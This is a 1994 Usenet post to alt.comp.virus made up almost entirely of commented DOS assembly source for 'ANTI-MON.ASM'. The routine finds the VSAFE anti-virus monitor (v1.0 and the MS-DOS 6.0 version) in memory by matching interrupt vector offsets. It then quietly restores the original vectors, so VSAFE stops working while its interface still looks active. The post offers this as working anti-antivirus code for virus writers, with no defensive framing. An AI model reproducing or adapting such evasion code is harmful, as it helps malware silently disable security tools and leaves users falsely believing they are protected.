From netcom.com!ix.netcom.com!netnews Tue Nov 29 09:43:12 1994
Xref: netcom.com alt.comp.virus:507
Path: netcom.com!ix.netcom.com!netnews
From: Zeppelin@ix.netcom.com (Mr. G)
Newsgroups: alt.comp.virus
Subject: Anti Monitor Virus (ANTI AV TSR)
Date: 29 Nov 1994 13:05:19 GMT
Organization: Netcom
Lines: 256
Distribution: world
Message-ID: <3bf8uf$ib9@ixnews1.ix.netcom.com>
References: <sbringerD00yHv.Hs3@netcom.com> <bradleymD011vJ.Lp8@netcom.com>
NNTP-Posting-Host: ix-pas2-10.ix.netcom.com

;***********************************************************************
***********************
;*                                                                      
                      *
;*      FILE:     ANTI-MON.ASM (c) 1993                                 
                      *
;*      PURPOSE:  Detect and remove a TSR anti-viral monitor            
                      *
;*      AUTHOR:   Willoughby    DATE: 05/09/93                          
                      *
;*                                                                      
                      *
;***********************************************************************
***********************

MAIN    SEGMENT BYTE
        ASSUME  CS:MAIN,DS:MAIN,ES:MAIN

        ORG     100H

;***********************************************************************
***********************
;The purpose of this routine is simply to demonstrate the function of 
the FIND_AV_MON and 
;NEUT_AV_MON routines.  It displays a message based upon the results of 
the test for TSR anti-
;viral monitor interrupt vectors performed by the FIND_AV_MON routine 
and the action taken, if 
;needed, by the NEUT_AV_MON routine.  

START:  call    FIND_AV_MON                     ;check for installed 
anti-viral monitors
        jc      MP1                             ;if carry is set, a 
monitor is present 
        mov     dx,OFFSET NOT_HERE_MSG          ;if not, display 
appropriate message
        jmp     MPEX                            ;during exit
MP1:    cmp     WORD PTR [MONITOR_TYPE],0       ;check for type/version 
of monitor present
        mov     dx,OFFSET MON0_HERE_MSG 
        je      MP2                             ;if MONITOR_TYPE = 0, 
display v1.0 message
        mov     dx,OFFSET MON1_HERE_MSG         ;otherwise, display v6.0 
message
MP2:    mov     ah,9
        int     21H
        call    NEUT_AV_MON                     ;then restore vectors to 
original values 
        mov     dx,OFFSET BUT_NOW_MSG           ;display monitor removal 
message
MPEX:   mov     ah,9
        int     21H
        mov     ax,4C00H                        ;exit program
        int     21H

NOT_HERE_MSG:   
        DB      0DH,0AH,'VSAFE is not present.',0DH,0AH,24H
MON0_HERE_MSG:
        DB      0DH,0AH,7,'VSAFE v1.0 is present.',0DH,0AH,24H
MON1_HERE_MSG:
        DB      0DH,0AH,7,'MS-DOS 6.0 VSAFE is present',0DH,0AH,24H
BUT_NOW_MSG:
        DB      0DH,0AH,'But now, it just APPEARS to be.',0DH,0AH,24H


;***********************************************************************
***********************
;This routine tests for the presence in memory of two versions of VSAFE 
by comparing the 
;offsets of the interrupt vectors stolen during VSAFE's installation 
with known VSAFE interrupt 
;handler offsets.  When it finds any three offset values in the system 
interrupt vector table 
;which match the VSAFE offsets for the corresponding interrupt, the 
carry flag is set to 
;indicate the presence of VSAFE in memory to the calling routine.  The 
segment in which VSAFE 
;resides is stored in MONITOR_SEGMENT and the VSAFE version stored in 
MONITOR_TYPE for use by 
;the NEUT_AV_MON routine. 

NUM_MONITORS    EQU     2                       ;# of anti-viral monitor 
types to check for
NUM_VECTORS     EQU     8                       ;# of interrupt vector 
table entries to check
MATCHES_REQ     EQU     3                       ;# of offset matches 
required for positive ID

FIND_AV_MON:
        push    es
        xor     ax,ax
        mov     es,ax                           ;set ES to segment of 
interrupt vector table
        mov     cx,NUM_VECTORS                  ;set loop counter to # 
of vectors to check 
        mov     si,OFFSET VECTOR_OFFSETS        ;point SI to start of 
vector offset string
FAMLP1: lodsw                                   ;load vector table 
offset of first vector
        mov     bx,ax
        mov     dx,w[es:bx]                     ;load offset of vector 
from table
        xor     di,di                          
FAMLP2: lodsw                                   ;load offset value used 
by anti-viral monitor
        cmp     dx,0FFFFH                       ;test for skip vector 
check value
        je      FAMLP3                          ;if skip value (FFFFH), 
exit inner loop
        cmp     dx,ax                           ;does vector table value 
match monitor value?
        jne     FAMLP3                                          ;if not, 
jump to end of loop
        inc     BYTE PTR [OFFSET TOTAL_MATCHES+di]              ;if so, 
increment match counter
        cmp     BYTE PTR [OFFSET TOTAL_MATCHES+di],MATCHES_REQ  
;required # of matches found?
        jne     FAMLP3                                          ;if not, 
jump to end of loop
        add     bx,2                            ;set BX to point at 
vector segment value
        mov     ax,WORD PTR [es:bx]             ;load anti-viral seg. 
value from vector table
        mov     MONITOR_SEGMENT,ax              ;store segment value
        mov     MONITOR_TYPE,di                 ;store monitor number 
indicating version/type
        stc                                     ;set carry flag to 
indicate monitor was found
        jmp     FAMEX                           
FAMLP3: inc     di                              ;increment monitor 
number
        cmp     di,NUM_MONITORS                 ;all monitor values 
checked for this vector?
        jne     FAMLP2                          ;if not, do it all again
        loop    FAMLP1                          ;if all vectors not 
checked, loop to check next
        clc                                     ;clear carry flag to 
indicate no monitor found
FAMEX:  pop     es
        ret                                     

MONITOR_SEGMENT DW      ?                       ;storage location for 
monitor segment value
MONITOR_TYPE    DW      ?                       ;ditto for monitor type

TOTAL_MATCHES:  DB      NUM_MONITORS    DUP     ?       ;table for 
vector match counts

VECTOR_OFFSETS:
        DW      004CH,1039H,0352H               ;INT 13H, VSAFE1 offset, 
VSAFE6 offset
        DW      0058H,12CDH,05DDH               ;INT 16H
        DW      0080H,138CH,06BCH               ;INT 20H
        DW      0084H,15F7H,0940H               ;INT 21H
        DW      009CH,1887H,0C0CH               ;INT 27H
        DW      00BCH,2476H,1440H               ;INT 2FH
        DW      0100H,1254H,05CBH               ;INT 40H
        DW      0024H,0FFFFH,02AFH              ;INT 09H (FFFFH = skip 
vector offset check)


;***********************************************************************
***********************
;This routine restores all but the keyboard interrupt vectors to their 
original values prior 
;to the residency of VSAFE.  This is accomplished by moving the 
original, unencrypted (!?) 
;vector values stored within VSAFE to their respective locations in the 
system interrupt vector 
;table.  VSAFE is, thereby, completely disabled, but appears to be fully 
functional because its 
;user interface continues to respond correctly to user inputs.  This 
routine uses the monitor 
;segment (MONITOR_SEGMENT) and monitor type/version (MONITOR_TYPE) 
values returned by the
;FIND_AV_MON routine. 

TABLE_SEGMENT   EQU     0                       ;interrupt vector table 
segment
NUM_RESTORE     EQU     6                       ;number of vectors to 
restore

NEUT_AV_MON:
        push    es
        mov     ax,OFFSET MON2_OFFSETS
        sub     ax,OFFSET MON1_OFFSETS
        mul     WORD PTR [MONITOR_TYPE]         ;calc. string offset for 
monitor type/version
        mov     si,OFFSET MON1_OFFSETS         
        add     si,ax                           ;point to first value in 
desired monitor string
        mov     di,OFFSET TABLE_OFFSETS         ;ditto for table offset 
string
        mov     cx,NUM_RESTORE                  ;set counter to number 
of vectors to restore  
RESTORE_VECTS:
        mov     bx,WORD PTR [si]                ;load monitor offset of 
original vector value
        cmp     bx,0FFFFH                       ;test for skip restoral 
value
        je      SKIP                            ;if skip value (FFFFH), 
then jump to loop
        mov     es,MONITOR_SEGMENT              ;set ES to monitor 
segment
        mov     ax,WORD PTR [es:bx]             ;load original vector 
offset from monitor
        mov     ORIGINAL_OFF,ax                 ;store in scratch pad
        mov     ax,WORD PTR [es:bx+2]           ;load original vector 
segment from monitor
        mov     ORIGINAL_SEG,ax                 ;store in scratch pad
        mov     bx,WORD PTR [di]                ;load corresponding int. 
vector table offset
        mov     es,TABLE_SEGMENT                ;set ES to int. vector 
table segment
        mov     ax,ORIGINAL_OFF                 ;load original vector 
offset
        mov     WORD PTR [es:bx],ax             ;store original offset 
in vector table
        mov     ax,ORIGINAL_SEG                 ;load original vector 
segment
        mov     WORD PTR [es:bx+2],ax           ;store original segment 
in vector table
SKIP:   add     si,2                            ;point SI to next string 
value
        add     di,2                            ;ditto for DI
        loop    RESTORE_VECTS                   ;loop to restore next 
vector
        pop     es
        ret                                     ;all done, monitor is 
totally neutralized

ORIGINAL_OFF    DW      ?                       ;temp. storage for 
original int. vector offset
ORIGINAL_SEG    DW      ?                       ;ditto for segment

TABLE_OFFSETS:
        DW      004CH,0080H,0084H,009CH,00BCH,0100H     ;offsets to INT 
vector table

MON1_OFFSETS:                                           ;VSAFE v1.0 
offsets where
        DW      1967H,196FH,1977H,197BH,242AH,197FH     ;original 
vectors are stored
                                                        ;(FFFFH = skip 
vector restoral)

MON2_OFFSETS:                                           ;MS-DOS 6.0 
VSAFE offsets where 
        DW      0DB3H,0DBBH,0DC3H,0DC7H,141EH,0DCBH     ;original 
vectors are stored
                                                        ;(FFFFH = skip 
vector restoral)

MAIN    ENDS



